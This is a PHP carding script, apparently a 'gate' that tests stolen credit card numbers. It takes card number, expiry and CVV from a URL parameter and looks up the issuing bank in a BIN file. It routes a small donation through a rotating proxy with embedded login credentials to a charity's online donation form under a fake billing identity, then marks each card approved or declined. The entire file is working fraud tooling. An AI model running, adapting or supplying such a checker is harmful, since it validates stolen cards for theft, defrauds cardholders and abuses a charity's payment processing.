<?php
$time = time();

    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function puxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
$bin1 = substr($cc, 0, 6); 
$file = 'bins.csv'; 
$searchfor = $bin1; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
    $encontrada = implode("\n", $matches[0]); 
}
$pieces = explode(";", $encontrada); 
$c = count($pieces);
if ($c == 8) { 
    $pais = $pieces[4]; 
    $paiscode = $pieces[5]; 
    $banco = $pieces[2]; 
    $level = $pieces[3]; 
    $bandeira = $pieces[1]; 
} else { 
    $pais = $pieces[5]; 
    $paiscode = $pieces[6]; 
    $link = $pieces[7]; 
    $level = $pieces[4]; 
    $banco = $pieces[2]; 
    $bandeira = $pieces[1]; 
}




$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://secure2.convio.net/alsa/site/Donation2");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "xotyjlsh-rotate:vzfrfocr2zg2");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(


'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded',
'Host: secure2.convio.net',
'Origin: https://secure2.convio.net',
'Referer: https://secure2.convio.net/alsa/site/Donation2?df_id=34700&34700.donation=form1',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.74'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, 'user_donation_amt=&company_min_matching_amt=&currency_locale=en_US&donor_name_for_recognition_input=Marcos&donor_name_for_recognitionsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpanded=68002&level_flexibleexpanded68002amount=5&level_flexibleexpandedsubmit=true&level_flexiblesubmit=true&level_flexiblegift_type=1&level_flexiblegift_typesubmit=true&level_flexibledurationsubmit_skip=true&ice_bucket_challenge_dropdown=true&ice_bucket_challengesubmit=true&tribute_show_honor_fieldssubmit=true&tribute_type=&tribute_typesubmit_skip=true&tribute_honoree_first_namename=&tribute_honoree_first_namesubmit_skip=true&tribute_honoree_last_namename=&tribute_honoree_last_namesubmit_skip=true&stationery_layout_chooser=true&stationery_layout_id=30966&select_gridsubmit=true&send_ecardsubmit=true&ecard_recpientsname=&ecard_recpientssubmit=true&tribute_ecard_subjectname=&tribute_ecard_subjectsubmit=true&tribute_ecard_messagename=&tribute_ecard_messagesubmit=true&nullsubmit=true&preview_buttonsubmit=true&recipient_title_dropdown=&recipient_titlesubmit=true&recipient_first_name_input=&recipient_first_namesubmit=true&recipient_last_name_input=&recipient_last_namesubmit=true&recipient_address_line_1_input=&recipient_address_line_1submit=true&recipient_address_line_2_input=&recipient_address_line_2submit=true&recipient_city_input=&recipient_citysubmit=true&recipient_state_dropdown=*+State%2FProvince&recipient_statesubmit=true&recipient_postal_code_input=&recipient_postal_codesubmit=true&recipient_country_dropdown=Country&recipient_countrysubmit=true&responsive_payment_typecc_typesubmit=true&responsive_payment_typecc_numbername='.$cc.'&responsive_payment_typecc_numbersubmit=true&responsive_payment_typecc_exp_date_MONTH='.$mes.'&responsive_payment_typecc_exp_date_YEAR='.$ano.'&responsive_payment_typecc_exp_date_DAY=1&responsive_payment_typecc_exp_datesubmit=true&responsive_payment_typecc_cvvname='.$cvv.'&responsive_payment_typecc_cvvsubmit=true&responsive_payment_typesubmit=true&billing_title=Mr.&billing_titlesubmit=true&billing_first_namename=Marcos&billing_first_namesubmit=true&billing_middle_namename=Silva&billing_middle_namesubmit=true&billing_last_namename=Noguuet&billing_last_namesubmit=true&billing_suffix=Sr.&billing_suffixsubmit=true&billing_addr_street1name=Bagda+american&billing_addr_street1submit=true&billing_addr_street2name=Bagda+american&billing_addr_street2submit=true&billing_addr_cityname=Bagda&billing_addr_citysubmit=true&billing_addr_state=None&billing_addr_statesubmit=true&billing_addr_zipname=15150000&billing_addr_zipsubmit=true&billing_addr_country=Brazil&billing_addr_countrysubmit=true&donor_phonename=17996540256&donor_phonesubmit=true&donor_email_addressname=fodase%40gmail.com&donor_email_addresssubmit=true&donor_email_opt_inname=on&donor_email_opt_insubmit=true&donor_remember_mename=on&donor_remember_mesubmit=true&pstep_finish=Complete+Donation&idb=1034956999&df_id=34700&mfc_pref=T&34700.donation=form1');
 $exec = curl_exec($ini);
#$token = puxar($exec, 'id": "', '"');




$retorno = puxar($exec, '<span class="field-error-text">','</span>');




if(strpos($exec, "The credit card was declined. Please check the information that you entered.")!== false){

    echo "<span class='label label-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv  - $bandeira - $banco - $level - $pais » Retorno: $retorno » Tempo de resposta gate: ".(time() - $time)."s <br>";

}

elseif(strpos($exec, "There was a problem processing your request.")!== false){

    echo "<span class='label label-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv  - $bandeira - $banco - $level - $pais » Retorno: $retorno » Tempo de resposta gate: ".(time() - $time)."s <br>";

}

elseif(strpos($exec, "This object cannot be accessed right now because another API request or Stripe process is currently accessing it. If you see this error intermittently, retry the request. If you see this error frequently and are making multiple concurrent requests to a single object, make your requests serially or at a lower rate")!== false){

    echo "<span class='label label-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv  - $bandeira - $banco - $level - $pais » Retorno: $retorno » Tempo de resposta gate: ".(time() - $time)."s <br>";

}

else{

    echo "<span class='label label-success'>#Aprovada</span> ✔ $cc|$mes|$ano|$cvv  - $bandeira - $banco - $level - $pais » Retorno: $retorno » Tempo de resposta gate: ".(time() - $time)."s » <span class='label label-info'>@Central7Club</span><br>";

}


?>